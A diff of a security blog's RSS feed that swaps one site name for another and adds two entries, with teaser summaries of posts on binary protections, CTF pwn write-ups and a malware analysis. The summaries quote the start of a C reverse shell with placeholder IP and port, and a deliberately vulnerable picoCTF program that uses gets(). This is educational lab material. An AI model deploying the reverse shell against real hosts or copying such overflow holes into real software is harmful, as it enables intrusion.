@@ -1,68 +1,19 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
-  <channel>
-    <title>mlowlevl</title>
-    <link>https://mlowlevl.xyz/</link>
-    <description>Recent content on mlowlevl</description>
-    <generator>Hugo</generator>
-    <language>en-us</language>
-    <lastBuildDate>Mon, 18 May 2026 00:00:00 +0000</lastBuildDate>
-    <atom:link href="https://mlowlevl.xyz/index.xml" rel="self" type="application/rss+xml" />
-    <item>
-      <title>Binary Security Mechanisms: PIE &#43; ASLR</title>
-      <link>https://mlowlevl.xyz/blog/binary-security-mechanisms-pie-aslr/</link>
-      <pubDate>Mon, 18 May 2026 00:00:00 +0000</pubDate>
-      <guid>https://mlowlevl.xyz/blog/binary-security-mechanisms-pie-aslr/</guid>
-      <description>In the previous article we covered RELRO. This time we&amp;rsquo;ll look at two mechanisms that are closely related: PIE and ASLR. If you haven&amp;rsquo;t read the RELRO article before you can find it here: RELRO Article . As mentioned in my last post, I’m starting a series of articles on my blog about binary security mechanisms and how to bypass them.&#xA;I will cover each of them in separate articles, this one focuses on PIE &amp;amp; ASLR.</description>
-    </item>
-    <item>
-      <title>Binary Security Mechanisms: RELRO</title>
-      <link>https://mlowlevl.xyz/blog/binary-security-mechanisms-relro/</link>
-      <pubDate>Sun, 17 May 2026 00:00:00 +0000</pubDate>
-      <guid>https://mlowlevl.xyz/blog/binary-security-mechanisms-relro/</guid>
-      <description>While doing a CTF today, I used my tool tio as usual to check the binary&amp;rsquo;s security mechanisms, and I thought I’d take a moment to write a small series of articles explaining what these mechanisms are, what they do, and how they can theoretically be bypassed.&#xA;(checksec output from the CTF I participated in)&#xA;As you can see, checksec shows 5 key security mechanisms:&#xA;RELRO STACK CANARY NX PIE RPATH/RUNPATH (there are more, but these are the 5 most important ones I will discuss in this series of articles.</description>
-    </item>
-    <item>
-      <title>you-know-0xdiablos - HackTheBox (pwn, Easy)</title>
-      <link>https://mlowlevl.xyz/writeups/pwn/you-know-0xdiablos-htb/</link>
-      <pubDate>Wed, 13 May 2026 00:00:00 +0000</pubDate>
-      <guid>https://mlowlevl.xyz/writeups/pwn/you-know-0xdiablos-htb/</guid>
-      <description>Initial Recon First I ran my tool tio to get some basic information about the program.&#xA;After that I started the program to see what happens.&#xA;The program starts with a simple banner (You know who are 0xDiablos) and an input field. When you type something into the input field, it just gets echoed back.&#xA;Source Code Analysis Since no source code was provided, I tried to disassemble the program in Ghidra.</description>
-    </item>
-    <item>
-      <title>What is libc, GOT and PLT?</title>
-      <link>https://mlowlevl.xyz/blog/what-is-plt-libc-got-blog-post/</link>
-      <pubDate>Sun, 10 May 2026 00:00:00 +0000</pubDate>
-      <guid>https://mlowlevl.xyz/blog/what-is-plt-libc-got-blog-post/</guid>
-      <description>PLT, GOT and libc are three common concepts every C/C++ programmer works with, but not every programmer is familiar with it so I thought I’d do a small post explaining it. I also will give a simple example how Hackers use libc or the GOT to exploit programs with bad security.&#xA;libc is the standard c library used by almost every C/C++ program on Linux. Its a collection of predefined functions such as printf ,puts ,mallocor fgets.</description>
-    </item>
-    <item>
-      <title>Malware Analysis: Simple Linux Reverse Shell in C</title>
-      <link>https://mlowlevl.xyz/writeups/malware-analysis/linux-reverse-shell/</link>
-      <pubDate>Fri, 17 Apr 2026 00:00:00 +0000</pubDate>
-      <guid>https://mlowlevl.xyz/writeups/malware-analysis/linux-reverse-shell/</guid>
-      <description>Introduction Today I am going to analyse my first piece of malware: A simple Linux Reverse Shell. I will analyse every part of this simple example and explain how everything works.&#xA;Code #include &amp;lt;sys/socket.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; #include &amp;lt;netinet/in.h&amp;gt; #include &amp;lt;arpa/inet.h&amp;gt; #include &amp;lt;sys/types.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;string.h&amp;gt; const char* CLIENT_IP = &amp;#34;IP HERE&amp;#34;; const int PORT = PORT HERE; int main() { pid_t pid = fork(); if(pid == -1) { puts(&amp;#34;Error fork failed&amp;#34;); return (1); } if(pid &amp;gt; 0) { return 0; } struct sockaddr_in sa; sa.</description>
-    </item>
-    <item>
-      <title>Heap 0 - picoCTF (pwn, Easy)</title>
-      <link>https://mlowlevl.xyz/writeups/pwn/heap0-picoctf/</link>
-      <pubDate>Wed, 08 Apr 2026 00:00:00 +0000</pubDate>
-      <guid>https://mlowlevl.xyz/writeups/pwn/heap0-picoctf/</guid>
-      <description>Task Are overflows just a stack concern? Download the binary here. Download the source here. Additional details will be available after launching your challenge instance. Author: Abrxs, pr1or1tyQ&#xA;Initial Recon First i started the program to get a overview on whats going on:&#xA;Welcome to heap0! I put my data on the heap so it should be safe from any tampering. Since my data isn&amp;#39;t on the stack I&amp;#39;ll even let you write whatever info you want to the heap, I already took care of using malloc for you.</description>
-    </item>
-    <item>
-      <title>Clutter-overflow - picoCTF (pwn, Medium)</title>
-      <link>https://mlowlevl.xyz/writeups/pwn/clutter-overflow-picoctf/</link>
-      <pubDate>Wed, 18 Mar 2026 00:00:00 +0000</pubDate>
-      <guid>https://mlowlevl.xyz/writeups/pwn/clutter-overflow-picoctf/</guid>
-      <description>Task -Clutter, clutter everywhere and not a byte to use. -No Hints&#xA;Source Code #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;stdlib.h&amp;gt; #define SIZE 256 #define GOAL 0xdeadbeef int main(void) { long code = 0; char clutter[SIZE]; setbuf(stdout, NULL); setbuf(stdin, NULL); setbuf(stderr, NULL); puts(&amp;#34;My room is so cluttered...&amp;#34;); puts(&amp;#34;What do you see?&amp;#34;); gets(clutter); if (code == GOAL) { printf(&amp;#34;code == 0x%llx: how did that happen??\n&amp;#34;, GOAL); puts(&amp;#34;take a flag for your troubles&amp;#34;); system(&amp;#34;cat flag.txt&amp;#34;); } else { printf(&amp;#34;code == 0x%llx\n&amp;#34;, code); printf(&amp;#34;code !</description>
-    </item>
-    <item>
-      <title>Control Hijack - pwn.college (pwn, Hard)</title>
-      <link>https://mlowlevl.xyz/writeups/pwn/control-hijack-hard-pwn-college/</link>
-      <pubDate>Thu, 12 Mar 2026 00:00:00 +0000</pubDate>
-      <guid>https://mlowlevl.xyz/writeups/pwn/control-hijack-hard-pwn-college/</guid>
-      <description>Task Overflow a buffer and smash the stack to obtain the flag!&#xA;Approach Unfortunately I can’t show the exact exploit details due to pwn.college rules, but I still want to share my general approach and thoughts.&#xA;My first step was running the program to understand its behavior. I noticed that the input was not properly limited, which indicated a potential buffer overflow vulnerability.&#xA;After that, I opened the binary in GDB to analyze what was happening internally.</description>
-    </item>
-  </channel>
-</rss>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>pr1meM</title><link>https://pr1mem.xyz/</link><description>Recent content on pr1meM</description><generator>Hugo</generator><language>en-us</language><lastBuildDate>Tue, 02 Jun 2026 00:00:00 +0000</lastBuildDate><atom:link href="https://pr1mem.xyz/index.xml" rel="self" type="application/rss+xml"/><item><title>Binary Security Mechanisms: Stack Canary</title><link>https://pr1mem.xyz/blog/binary-security-mechanisms-stack-canary/</link><pubDate>Tue, 02 Jun 2026 00:00:00 +0000</pubDate><guid>https://pr1mem.xyz/blog/binary-security-mechanisms-stack-canary/</guid><description>In the previous article we covered RELRO and ASLR + PIE, in this section, we&amp;rsquo;ll focus on the stack canary. This is my third post in this short series of articles in which I explain the five most important binary security mechanisms. If you haven&amp;rsquo;t read the other articles yet, you can do so here and here.
+Stack Canary The stack canary is a random value that the compiler inserts between the local variables and the RBP, return address.</description></item><item><title>Split - ROP Emporium</title><link>https://pr1mem.xyz/writeups/pwn/split-ropemporiumctf/</link><pubDate>Mon, 25 May 2026 00:00:00 +0000</pubDate><guid>https://pr1mem.xyz/writeups/pwn/split-ropemporiumctf/</guid><description>Task The elements that allowed you to complete ret2win are still present, they&amp;rsquo;ve just been split apart. Find them and recombine them using a short ROP chain.
+Initial Recon As always, I started by using my tool, TIO, to get some basic information about the binary.
+There is no stack canary, which means a potential buffer overflow would be easy to exploit. Additionally, there is no PIE, which means all addresses in the binary are fixed.</description></item><item><title>Binary Security Mechanisms: PIE + ASLR</title><link>https://pr1mem.xyz/blog/binary-security-mechanisms-pie-aslr/</link><pubDate>Mon, 18 May 2026 00:00:00 +0000</pubDate><guid>https://pr1mem.xyz/blog/binary-security-mechanisms-pie-aslr/</guid><description>In the previous article we covered RELRO. This time we&amp;rsquo;ll look at two mechanisms that are closely related: PIE and ASLR. If you haven&amp;rsquo;t read the RELRO article before you can find it here: RELRO Article . As mentioned in my last post, I’m starting a series of articles on my blog about binary security mechanisms and how to bypass them.
+I will cover each of them in separate articles, this one focuses on PIE &amp;amp; ASLR.</description></item><item><title>Binary Security Mechanisms: RELRO</title><link>https://pr1mem.xyz/blog/binary-security-mechanisms-relro/</link><pubDate>Sun, 17 May 2026 00:00:00 +0000</pubDate><guid>https://pr1mem.xyz/blog/binary-security-mechanisms-relro/</guid><description>While doing a CTF today, I used my tool tio as usual to check the binary&amp;rsquo;s security mechanisms, and I thought I’d take a moment to write a small series of articles explaining what these mechanisms are, what they do, and how they can theoretically be bypassed.
+(checksec output from the CTF I participated in)
+As you can see, checksec shows 5 key security mechanisms:
+RELRO STACK CANARY NX PIE RPATH/RUNPATH (there are more, but these are the 5 most important ones I will discuss in this series of articles.</description></item><item><title>you-know-0xdiablos - HackTheBox (pwn, Easy)</title><link>https://pr1mem.xyz/writeups/pwn/you-know-0xdiablos-htb/</link><pubDate>Wed, 13 May 2026 00:00:00 +0000</pubDate><guid>https://pr1mem.xyz/writeups/pwn/you-know-0xdiablos-htb/</guid><description>Initial Recon First I ran my tool tio to get some basic information about the program.
+After that I started the program to see what happens.
+The program starts with a simple banner (You know who are 0xDiablos) and an input field. When you type something into the input field, it just gets echoed back.
+Source Code Analysis Since no source code was provided, I tried to disassemble the program in Ghidra.</description></item><item><title>What is libc, GOT and PLT?</title><link>https://pr1mem.xyz/blog/what-is-plt-libc-got-blog-post/</link><pubDate>Sun, 10 May 2026 00:00:00 +0000</pubDate><guid>https://pr1mem.xyz/blog/what-is-plt-libc-got-blog-post/</guid><description>PLT, GOT and libc are three common concepts every C/C++ programmer works with, but not every programmer is familiar with it so I thought I’d do a small post explaining it. I also will give a simple example how Hackers use libc or the GOT to exploit programs with bad security.
+libc is the standard c library used by almost every C/C++ program on Linux. Its a collection of predefined functions such as printf ,puts ,mallocor fgets.</description></item><item><title>Malware Analysis: Simple Linux Reverse Shell in C</title><link>https://pr1mem.xyz/writeups/malware-analysis/linux-reverse-shell/</link><pubDate>Fri, 17 Apr 2026 00:00:00 +0000</pubDate><guid>https://pr1mem.xyz/writeups/malware-analysis/linux-reverse-shell/</guid><description>Introduction Today I am going to analyse my first piece of malware: A simple Linux Reverse Shell. I will analyse every part of this simple example and explain how everything works.
+Code #include &amp;lt;sys/socket.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; #include &amp;lt;netinet/in.h&amp;gt; #include &amp;lt;arpa/inet.h&amp;gt; #include &amp;lt;sys/types.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;string.h&amp;gt; const char* CLIENT_IP = &amp;#34;IP HERE&amp;#34;; const int PORT = PORT HERE; int main() { pid_t pid = fork(); if(pid == -1) { puts(&amp;#34;Error fork failed&amp;#34;); return (1); } if(pid &amp;gt; 0) { return 0; } struct sockaddr_in sa; sa.</description></item><item><title>Heap 0 - picoCTF (pwn, Easy)</title><link>https://pr1mem.xyz/writeups/pwn/heap0-picoctf/</link><pubDate>Wed, 08 Apr 2026 00:00:00 +0000</pubDate><guid>https://pr1mem.xyz/writeups/pwn/heap0-picoctf/</guid><description>Task Are overflows just a stack concern? Download the binary here. Download the source here. Additional details will be available after launching your challenge instance. Author: Abrxs, pr1or1tyQ
+Initial Recon First i started the program to get a overview on whats going on:
+Welcome to heap0! I put my data on the heap so it should be safe from any tampering. Since my data isn&amp;#39;t on the stack I&amp;#39;ll even let you write whatever info you want to the heap, I already took care of using malloc for you.</description></item><item><title>Clutter-overflow - picoCTF (pwn, Medium)</title><link>https://pr1mem.xyz/writeups/pwn/clutter-overflow-picoctf/</link><pubDate>Wed, 18 Mar 2026 00:00:00 +0000</pubDate><guid>https://pr1mem.xyz/writeups/pwn/clutter-overflow-picoctf/</guid><description>Task -Clutter, clutter everywhere and not a byte to use. -No Hints
+Source Code #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;stdlib.h&amp;gt; #define SIZE 256 #define GOAL 0xdeadbeef int main(void) { long code = 0; char clutter[SIZE]; setbuf(stdout, NULL); setbuf(stdin, NULL); setbuf(stderr, NULL); puts(&amp;#34;My room is so cluttered...&amp;#34;); puts(&amp;#34;What do you see?&amp;#34;); gets(clutter); if (code == GOAL) { printf(&amp;#34;code == 0x%llx: how did that happen??\n&amp;#34;, GOAL); puts(&amp;#34;take a flag for your troubles&amp;#34;); system(&amp;#34;cat flag.txt&amp;#34;); } else { printf(&amp;#34;code == 0x%llx\n&amp;#34;, code); printf(&amp;#34;code !</description></item><item><title>Control Hijack - pwn.college (pwn, Hard)</title><link>https://pr1mem.xyz/writeups/pwn/control-hijack-hard-pwn-college/</link><pubDate>Thu, 12 Mar 2026 00:00:00 +0000</pubDate><guid>https://pr1mem.xyz/writeups/pwn/control-hijack-hard-pwn-college/</guid><description>Task Overflow a buffer and smash the stack to obtain the flag!
+Approach Unfortunately I can’t show the exact exploit details due to pwn.college rules, but I still want to share my general approach and thoughts.
+My first step was running the program to understand its behavior. I noticed that the input was not properly limited, which indicated a potential buffer overflow vulnerability.
+After that, I opened the binary in GDB to analyze what was happening internally.</description></item></channel></rss>
